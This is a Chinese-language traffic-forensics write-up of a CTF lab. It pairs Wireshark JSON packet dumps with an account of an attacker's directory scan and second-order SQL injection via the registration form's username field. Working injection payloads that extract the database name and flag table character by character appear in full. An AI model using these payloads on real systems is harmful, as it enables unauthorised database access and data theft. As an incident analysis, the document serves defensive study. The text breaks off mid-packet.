{"_index": "packets-2023-04-22", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 22, 2023 15:38:16.314845000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682149096.314845000", "frame.time_delta": "0.000186000", "frame.time_delta_displayed": "0.000186000", "frame.time_relative": "91870.687648000", "frame.number": "1722364", "frame.len": "1268", "frame.cap_len": "1268", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines", "frame.coloring_rule.name": "HTTP", "frame.coloring_rule.string": "http || tcp.port == 80 || http2"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "ba:31:7f:1e:19:45", "eth.src_tree": {"eth.src_resolved": "ba:31:7f:1e:19:45", "eth.src.oui": "12202367", "eth.addr": "ba:31:7f:1e:19:45", "eth.addr_resolved": "ba:31:7f:1e:19:45", "eth.addr.oui": "12202367", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "1254", "ip.id": "0x3f0b", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0x371c", "ip.checksum.status": "2", "ip.src": "10.255.169.209", "ip.addr": "99.999.9.25", "ip.src_host": "10.255.169.209", "ip.host": "99.999.9.25", "ip.dst": "99.999.9.25", "ip.dst_host": "99.999.9.25"}, "tcp": {"tcp.srcport": "43286", "tcp.dstport": "7001", "tcp.port": "7001", "tcp.stream": "39028", "tcp.completeness": "31", "tcp.len": "1202", "tcp.seq": "11171", "tcp.seq_raw": "846156483", "tcp.nxtseq": "12373", "tcp.ack": "8080", "tcp.ack_raw": "5144974", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xc4c3", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:a8:78:47:15:7b:fe:e7:97", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:a8:78:47:15:7b:fe:e7:97", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2826454805", "tcp.options.timestamp.tsecr": "2080302999"}}, "Timestamps": {"tcp.time_relative": "446.749344000", "tcp.time_delta": "0.000186000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.129933000", "tcp.analysis.bytes_in_flight": "1214", "tcp.analysis.push_bytes_sent": "1202"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:32:30:30:20:4f:4b:0d:0a:44:61:74:65:3a:20:53:61:74:2c:20:32:32:20:41:70:72:20:32:30:32:33:20:30:37:3a:33:38:3a:31:36:20:47:4d:54:0d:0a:53:65:72:76:65:72:3a:20:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:0d:0a:58:2d:50:6f:77:65:72:65:64:2d:42:79:3a:20:50:48:50:2f:35:2e:35:2e:39:2d:31:75:62:75:6e:74:75:34:2e:32:39:0d:0a:45:78:70:69:72:65:73:3a:20:54:68:75:2c:20:31:39:20:4e:6f:76:20:31:39:38:31:20:30:38:3a:35:32:3a:30:30:20:47:4d:54:0d:0a:43:61:63:68:65:2d:43:6f:6e:74:72:6f:6c:3a:20:6e:6f:2d:73:74:6f:72:65:2c:20:6e:6f:2d:63:61:63:68:65:2c:20:6d:75:73:74:2d:72:65:76:61:6c:69:64:61:74:65:2c:20:70:6f:73:74:2d:63:68:65:63:6b:3d:30:2c:20:70:72:65:2d:63:68:65:63:6b:3d:30:0d:0a:50:72:61:67:6d:61:3a:20:6e:6f:2d:63:61:63:68:65:0d:0a:56:61:72:79:3a:20:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:0d:0a:43:6f:6e:74:65:6e:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:37:39:33:0d:0a:4b:65:65:70:2d:41:6c:69:76:65:3a:20:74:69:6d:65:6f:75:74:3d:35:2c:20:6d:61:78:3d:39:37:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:4b:65:65:70:2d:41:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:0d:0a:0d:0a:1f:8b:08:00:00:00:00:00:00:03:95:55:cd:72:d3:30:10:be:f7:29:84:18:c6:e9:4c:1c:a7:a5:b4:25:b5:73:80:69:07:66:60:38:b4:2f:a0:48:1b:5b:ad:2c:bb:92:ec:34:30:dc:38:70:65:a6:27:9e:80:67:e0:7d:a0:af:81:64:d9:89:d3:06:86:5e:92:dd:6f:f7:db:3f:ad:e4:f8:09:2b:a8:59:96:80:32:93:8b:e9:4e:ec:fe:90:20:32:4d:30:48:3c:dd:41:28:ce:80:30:27:58:31:07:43:10:cd:88:d2:60:12:5c:99:79:78:8c:5b:93:e1:46:c0:f4:f7:d7:6f:77:df:bf:fc:fa:79:7b:77:fb:23:8e:3c:d6:a3:66:c6:94:21:5c:57:bc:4e:30:15:40:94:4b:8d:11:2d:a4:01:69:23:16:12:f7:dd:25:c9:21:c1:ef:8b:19:17:f0:a1:34:3c:e7:1f:81:f5:dc:9f:ef:8f:b7:f8:bf:21:92:65:20:d8:99:e2:20:99:58:f6:08:17:aa:82:2d:0c:52:96:02:c2:bc:c9:13:2e:60:16:5a:20:a4:a4:24:33:d1:af:6e:09:7a:0b:b9:e6:b0:28:0b:65:7a:8e:0b:ce:4c:96:30:a8:39:b5:f1:9c:32:cc:80:a7:99:e9:30:af:0d:b9:e4:86:13:11:6a:4a:04:24:7b:a3:f1:30:b7:50:5e:e5:7d:84:dc:dc:43:2a:0d:aa:51:5d:79:89:2c:30:8a:da:aa:04:97:57:48:81:48:b0:36:4b:01:3a:03:b0:65:65:0a:e6:09:1e:45:6b:4c:47:5c:32:b8:19:51:bd:6a:e8:ff:a9:73:41:0c:b7:ad:36:ec:87:a9:83:b5:6f:e0:f9:c1:26:bf:91:1d:39:f0:e4:38:ea:16:2c:9e:15:6c:39:dd:f1:01:25:a9:11:67:09:ce:41:56:6d:91:16:65:bc:ee:64:af:21:2a:88:d6:09:e6:79:1a:5a:15:af:ad:9b:f6:66:68:d6:09:4f:63:fb:8b:b4:a2:ae:af:aa:14:05:61:3a:22:a3:cb:12:9c:2d:da:48:60:43:e8:92:c8:8d:18:ee:d0:37:b2:20:f4:f2:b8:47:88:1c:a3:57:63:3f:62:4f:89:23:db:60:d7:6b:4e:b8:6c:9a:b5:54:10:eb:6e:dd:60:40:f5:82:79:a0:ab:a7:b4:bf:a1:87:f0:5f:8b:ee:39:85:cd:7d:c4:d3:d7:17:67:f7:cb:6c:87:e5:6a:98:11:7a:15:6e:4c:fd:e1:34:53:b1:2c:b3:d0:6d:01:ea:d6:21:74:bc:fb:94:07:e3:7c:00:74:59:dd:6c:b9:9c:17:e1:42:91:52:3f:32:b5:7d:8d:0c:97:a9:0e:f7:1e:55:80:df:bc:f5:80:fd:66:b8:f5:b4:6b:47:6e:fc:cd:9d:ec:8d:c7:cf:4e:9c:ea:2f:ed:c4:03:45:0d:6a:2e:8a:c5:24:e3:8c:81:3c:c1:7e:a5:78:4e:52:d0:d1:e1:d1:c1:c1:f8:c8:2e:55:8a:11:11:f6:45:c0:db:73:c6:91:3b:fa:56:d6:54:f1:d2:74:ab:79:49:6a:e2:11:7b:65:04:67:50:54:66:25:8c:ec:3b:31:ba:d4:6e:61:bd:cf:46:88:2e:57:4d:14:ea:18:28:41:12:16:e8:bc:55:07:9f:56:43:09:9a:a5:0b:26:c8:7e:09:2a:7b:ee:66:94:82:39:15:e0:c4:57:cb:b7:6c:d0:3a:ec:0e:d7:14:b7:1e:ff:62:34:f6:3e:a1:24:8c:d9:13:b2:9c:fd:17:87:3d:dc:14:02:14:91:14:ac:e5:68:dc:e2:9f:77:4f:76:5a:71:95:e1:ba:02:b5:3c:07:01:d4:14:6a:10:3c:5d:6d:69:b0:3b:b2:b1:4f:6b:eb:f4:8e:6b:fb:fe:82:35:53:c1:e9:55:30:44:f3:4a:52:c3:0b:39:d8:45:eb:86:57:43:34:45:9a:0a:18:d8:6c:eb:bc:fe:54:ba:39:36:cf:93:7f:95:ec:c1:b9:2f:e4:1f:9c:39:22:e0:31:07:00:00"}, "http": {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 07:38:16 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.cache_control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "http.content_encoding": "gzip", "http.content_length_header": "793", "http.content_length_header_tree": {"http.content_length": "793"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "10", "http.prev_request_in": "1722351", "http.prev_response_in": "1722356", "http.next_request_in": "1722368", "http.next_response_in": "1722371", "http.response_for.uri": "http://10.0.0.4/login.php", "Content-encoded entity body (gzip): 793 bytes -> 1841 bytes": "", "http.file_data": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>������������</title>\n    <meta http-equiv=\"cleartype\" content=\"on\">\n    <meta name=\"MobileOptimized\" content=\"320\">\n    <meta name=\"HandheldFriendly\" content=\"True\">\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\n    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\n    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\n    <link rel='stylesheet' href='./stylesheets/style.css' />\n  </head>\n  <body>\n\n    <nav id=\"menu\">\n      <div>\n        <div class=\"img-div\">\n          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\n          <span class=\"user-name\">\n            98          </span>\n        </div>\n      </div>\n    </nav>\n\n    <main id=\"panel\">\n      <header>\n        <header class=\"pass-header\">\n          <span class=\"pass-header-title\">CTF</span>\n          <div id=\"back-menu\">\n            <div class=\"glyph-icon flaticon-back\">\n            </div>\n          </div>\n          <div id=\"userinfo-wraps\">\n            <div class=\"glyph-icon flaticon-settings-1\">\n            </div>\n          </div>\n      </header>\n      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\n      </header>\n    </main>\n    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\n    <script>\n      var slideout = new Slideout({\n        'panel': document.getElementById('panel'),\n        'menu': document.getElementById('menu'),\n        'padding': 256,\n        'tolerance': 70\n      });\n\n      document.querySelector('#back-menu').addEventListener('click', function() {\n        slideout.toggle();\n      });\n    </script>\n\n  </body>\n</html>"}, "data-text-lines": {"<!doctype html>\\n": "", "<html lang=\"en\">\\n": "", "  <head>\\n": "", "    <meta charset=\"utf-8\">\\n": "", "    <title>我的应用</title>\\n": "", "    <meta http-equiv=\"cleartype\" content=\"on\">\\n": "", "    <meta name=\"MobileOptimized\" content=\"320\">\\n": "", "    <meta name=\"HandheldFriendly\" content=\"True\">\\n": "", "    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\\n": "", "    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\\n": "", "    <link rel='stylesheet' href='./stylesheets/style.css' />\\n": "", "  </head>\\n": "", "  <body>\\n": "", "\\n": "", "    <nav id=\"menu\">\\n": "", "      <div>\\n": "", "        <div class=\"img-div\">\\n": "", "          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\\n": "", "          <span class=\"user-name\">\\n": "", "            98          </span>\\n": "", "        </div>\\n": "", "      </div>\\n": "", "    </nav>\\n": "", "    <main id=\"panel\">\\n": "", "      <header>\\n": "", "        <header class=\"pass-header\">\\n": "", "          <span class=\"pass-header-title\">CTF</span>\\n": "", "          <div id=\"back-menu\">\\n": "", "            <div class=\"glyph-icon flaticon-back\">\\n": "", "            </div>\\n": "", "          </div>\\n": "", "          <div id=\"userinfo-wraps\">\\n": "", "            <div class=\"glyph-icon flaticon-settings-1\">\\n": "", "      </header>\\n": "", "      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\\n": "", "    </main>\\n": "", "    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\\n": "", "    <script>\\n": "", "      var slideout = new Slideout({\\n": "", "        'panel': document.getElementById('panel'),\\n": "", "        'menu': document.getElementById('menu'),\\n": "", "        'padding': 256,\\n": "", "        'tolerance': 70\\n": "", "      });\\n": "", "      document.querySelector('#back-menu').addEventListener('click', function() {\\n": "", "        slideout.toggle();\\n": "", "    </script>\\n": "", "  </body>\\n": "", "</html>": ""}}}}
```

可以发现，/index.php回显的用户名非常规律，均为一个0和128之间的数字，联想之前几位同学使用ASCII码提取flag的过程，推测攻击者已经完成了SQL注入并拿到了flag。

## 26

### 攻击步骤 4-1

（准备动作）攻击者在Apr 22, 2023 20:40:21.745054000 中国标准时间访问目标网站。一开始攻击者只是访问了登录界面。并没有注册。

从Apr 22, 2023 20:43:10.617554000 中国标准时间到Apr 22, 2023 20:44:07.607579000 中国标准时间之间，攻击者开始进行目录扫描，尝试访问/wp-login/、/wwwroot.tgz、/~admin等大量靶机上不存在的URL。

### 攻击步骤 4-2

（成功动作）Apr 22, 2023 20:58:59.196454000 中国标准时间，攻击者使用了0'+ascii(substr(database() from 1 for 1))+'0的SQL语句片段尝试提取数据库名，但也只提取了database库名的第一个字符。

```
{"_index": "packets-2023-04-22", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 22, 2023 20:58:59.196454000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682168339.196454000", "frame.time_delta": "0.000210000", "frame.time_delta_displayed": "0.000210000", "frame.time_relative": "111113.569257000", "frame.number": "2577073", "frame.len": "755", "frame.cap_len": "755", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "62:eb:fa:25:cd:cc", "eth.dst_tree": {"eth.dst_resolved": "62:eb:fa:25:cd:cc", "eth.dst.oui": "6482938", "eth.addr": "62:eb:fa:25:cd:cc", "eth.addr_resolved": "62:eb:fa:25:cd:cc", "eth.addr.oui": "6482938", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "741", "ip.id": "0x0000", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x6233", "ip.checksum.status": "2", "ip.src": "99.999.9.26", "ip.addr": "10.255.193.204", "ip.src_host": "99.999.9.26", "ip.host": "10.255.193.204", "ip.dst": "10.255.193.204", "ip.dst_host": "10.255.193.204"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "34778", "tcp.port": "34778", "tcp.stream": "44497", "tcp.completeness": "31", "tcp.len": "689", "tcp.seq": "13579899", "tcp.seq_raw": "18893702", "tcp.nxtseq": "13580588", "tcp.ack": "41913784", "tcp.ack_raw": "2566619655", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "4446", "tcp.window_size": "284544", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0xcc85", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:34:e8:0d:67:fe:cd:ca:6c", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:34:e8:0d:67:fe:cd:ca:6c", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "887623015", "tcp.options.timestamp.tsecr": "4274899564"}}, "Timestamps": {"tcp.time_relative": "9049.980668000", "tcp.time_delta": "0.000210000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.080515000", "tcp.analysis.bytes_in_flight": "701", "tcp.analysis.push_bytes_sent": "689"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:4d:61:63:69:6e:74:6f:73:68:3b:20:49:6e:74:65:6c:20:4d:61:63:20:4f:53:20:58:20:31:30:2e:31:35:3b:20:72:76:3a:31:30:39:2e:30:29:20:47:65:63:6b:6f:2f:32:30:31:30:30:31:30:31:20:46:69:72:65:66:6f:78:2f:31:31:32:2e:30:0d:0a:41:63:63:65:70:74:3a:20:74:65:78:74:2f:68:74:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:68:74:6d:6c:2b:78:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:6d:6c:3b:71:3d:30:2e:39:2c:69:6d:61:67:65:2f:61:76:69:66:2c:69:6d:61:67:65:2f:77:65:62:70:2c:2a:2f:2a:3b:71:3d:30:2e:38:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:7a:68:2d:43:4e:2c:7a:68:3b:71:3d:30:2e:38:2c:7a:68:2d:54:57:3b:71:3d:30:2e:37:2c:7a:68:2d:48:4b:3b:71:3d:30:2e:35:2c:65:6e:2d:55:53:3b:71:3d:30:2e:33:2c:65:6e:3b:71:3d:30:2e:32:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:2f:72:65:67:69:73:74:65:72:2e:70:68:70:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:62:31:68:35:63:6e:68:6b:64:69:66:37:36:66:6b:63:75:71:33:67:66:72:76:6c:73:37:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:0d:0a:65:6d:61:69:6c:3d:31:25:34:30:31:36:33:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:64:61:74:61:62:61:73:65:25:32:38:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:25:33:42:26:70:61:73:73:77:6f:72:64:3d:31"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Upgrade-Insecure-Requests: 1\r\n", "http.user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "http.accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "http.accept_language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "http.accept_encoding": "gzip, deflate", "http.content_type": "application/x-www-form-urlencoded", "http.content_length_header": "105", "http.content_length_header_tree": {"http.content_length": "105"}, "http.connection": "keep-alive", "http.referer": "http://10.0.0.4/register.php", "http.cookie": "PHPSESSID=b1h5cnhkdif76fkcuq3gfrvls7", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=b1h5cnhkdif76fkcuq3gfrvls7"}, "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "47212", "http.prev_request_in": "2572838", "http.response_in": "2577079", "http.next_request_in": "2577086", "http.file_data": "email=1%40163.com&username=0%27%2Bascii%28substr%28database%28%29+from+1+for+1%29%29%2B%270%3B&password=1"}, "urlencoded-form": {"Form item: \"email\" = \"1@163.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "1@163.com"}, "Form item: \"username\" = \"0'+ascii(substr(database() from 1 for 1))+'0;\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr(database() from 1 for 1))+'0;"}, "Form item: \"password\" = \"1\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "1"}}}}}
```

从Apr 22, 2023 21:13:26.970588000 中国标准时间到Apr 22, 2023 21:38:05.767854000 中国标准时间之间，攻击者以0'+ascii(substr((select * from flag) from 4 for 1))+'0;作为用户名进行SQL注入攻击，尝试获取flag。

```
{"_index": "packets-2023-04-22", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 22, 2023 21:13:26.970588000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682169206.970588000", "frame.time_delta": "0.000076000", "frame.time_delta_displayed": "0.000076000", "frame.time_relative": "111981.343391000", "frame.number": "2595482", "frame.len": "405", "frame.cap_len": "405", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "62:eb:fa:25:cd:cc", "eth.dst_tree": {"eth.dst_resolved": "62:eb:fa:25:cd:cc", "eth.dst.oui": "6482938", "eth.addr": "62:eb:fa:25:cd:cc", "eth.addr_resolved": "62:eb:fa:25:cd:cc", "eth.addr.oui": "6482938", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "391", "ip.id": "0x0000", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x6391", "ip.checksum.status": "2", "ip.src": "99.999.9.26", "ip.addr": "10.255.193.204", "ip.src_host": "99.999.9.26", "ip.host": "10.255.193.204", "ip.dst": "10.255.193.204", "ip.dst_host": "10.255.193.204"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "34778", "tcp.port": "34778", "tcp.stream": "44497", "tcp.completeness": "31", "tcp.len": "339", "tcp.seq": "13637785", "tcp.seq_raw": "18951588", "tcp.nxtseq": "13638124", "tcp.ack": "42233069", "tcp.ack_raw": "2566938940", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "4446", "tcp.window_size": "284544", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0x0641", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:34:f5:4b:24:fe:db:08:2d", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:34:f5:4b:24:fe:db:08:2d", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "888490788", "tcp.options.timestamp.tsecr": "4275767341"}}, "Timestamps": {"tcp.time_relative": "9917.754802000", "tcp.time_delta": "0.000076000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.080515000", "tcp.analysis.bytes_in_flight": "339", "tcp.analysis.push_bytes_sent": "339"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:38:2e:32:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:31:37:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:31:25:34:30:31:36:33:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:25:33:42:26:70:61:73:73:77:6f:72:64:3d:31"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.28.2", "http.accept_encoding": 